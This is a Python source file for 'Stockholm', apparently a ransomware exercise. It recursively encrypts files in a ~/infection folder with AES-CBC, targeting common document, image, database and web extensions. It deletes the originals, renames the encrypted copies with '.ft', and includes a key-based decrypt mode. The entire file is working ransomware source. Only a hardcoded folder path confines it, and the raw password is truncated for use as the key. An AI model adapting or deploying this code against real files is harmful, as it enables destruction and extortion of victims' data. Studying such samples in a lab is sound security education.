import os
import sys
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import argparse

VERSION = "1.0"
IV_LENGTH = 16
KEY_LENGTH = 32
BLOCK_SIZE = 16
INFECTED_FOLDER = os.path.join(os.path.expanduser("~"), "infection")
AFFECTED_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.bmp', '.tif', '.dbf', '.sql', '.mdb', '.sln', '.php', '.asp', '.aspx', '.html', '.xml', '.psd']

def encrypt_file(filename, key, silent=False):
    if filename.endswith('.ft'):
        if not silent:
            print(f"File {filename} already encrypted.")
        return # Don't encrypt an already encrypted file

    if not any(filename.endswith(ext) for ext in AFFECTED_EXTENSIONS):
        print(f"File {filename} not affected.")
        return # Don't encrypt files that aren't in the list

    with open(filename, 'rb') as file:
        data = file.read() # Read the contents of the file

    iv = get_random_bytes(IV_LENGTH) # Generate a random IV
    cipher = AES.new(key, AES.MODE_CBC, iv)# Create a cipher object
    encrypted_data = iv + cipher.encrypt(pad(data)) # Add IV to the beginning of the encrypted data
    os.remove(filename)  # Remove original file
    new_filename = filename + '.ft'  # Add .ft extension to filename

    with open(new_filename, 'wb') as file: # Open a new file
        file.write(encrypted_data) # Write encrypted data to a new file

    if not silent: # Don't print anything if silent mode is enabled
        print(f"Encrypted {filename}")

def decrypt_file(filename, key, silent=False): # Decrypt a file
    base_filename, extension = os.path.splitext(filename)# Split the filename and extension into two variables (base_filename and extension)")

    if not extension == '.ft': # If the file doesn't have the .ft extension, it's not encrypted
        if not silent:
            print(f"File {filename} is not encrypted.")
        return

    with open(filename, 'rb') as file: # Open the encrypted file  in read-only mode
        data = file.read() # Read the contents of the encrypted file

    iv = data[:IV_LENGTH] # Get the IV from the beginning of the file (first 16 bytes)
    cipher = AES.new(key, AES.MODE_CBC, iv) # Create a cipher object
    decrypted_data = unpad(cipher.decrypt(data[IV_LENGTH:])) # Decrypt and unpad the data (remove the IV from the beginning of the file)
    new_filename = base_filename  # Remove .ft extension from filename

    with open(new_filename, 'wb') as file: # Open a new file
        file.write(decrypted_data) # Write decrypted data to a new file

    os.remove(filename) # Remove original file (encrypted file)

    if not silent:
        print(f"Decrypted {filename}")

def pad(data): # Pad data to be a multiple of 16 bytes
    padding_length = BLOCK_SIZE - (len(data) % BLOCK_SIZE) # Calculate the number of bytes that need to be padded
    padding = bytes([padding_length] * padding_length)  # Create padding
    return data + padding # Add padding to the data

def unpad(data): # Remove padding from data
    padding_length = data[-1] # Get the last byte of the data (this is the padding length)
    return data[:-padding_length]   # Remove padding from the data

def process_files(key, action, silent=False): # Encrypt or decrypt all files in the infected folder
    if action == "decrypt" and not os.path.exists(INFECTED_FOLDER): # If the infected folder doesn't exist, there are no infected files
        print("No infected files found.")   
        sys.exit(0)

    if not silent:
        print(f"{action.capitalize()}ing files...")

    for root, dirs, files in os.walk(INFECTED_FOLDER): # Walk through the infected folder
        for filename in files: # Loop through all files in the infected folder
            if filename != sys.argv[0]: # Don't encrypt or decrypt the stockholm.py file
                filepath = os.path.join(root, filename)
                if action == "encrypt":
                    encrypt_file(filepath, key, silent)
                else:
                    decrypt_file(filepath, key, silent)

def main():
    parser = argparse.ArgumentParser(description='Stockholm - File Encryption/Decryption Tool')
    parser.add_argument('-r', metavar='key', help='Revert encryption using the encryption key')
    parser.add_argument('-v', action='store_true', help='Display version information')
    parser.add_argument('-s', action='store_true', help='Silent mode (no output)')
    args = parser.parse_args()

    if args.v:
        print(f"Stockholm version {VERSION}")
        sys.exit(0)

    silent = args.s

    if not args.r:
        password = input("Enter your encryption key (at least 16 characters): ")
        key = password.encode()[:KEY_LENGTH] # Convert the password to bytes and get the first 32 bytes
        action = "encrypt" # Set action to encrypt 
    else: 
        key = args.r.encode()[:KEY_LENGTH] # Convert the key to bytes and get the first 32 bytes
        action = "decrypt" # Set action to decrypt

    process_files(key, action, silent) # Encrypt or decrypt all files in the infected folder

if __name__ == "__main__":
    main()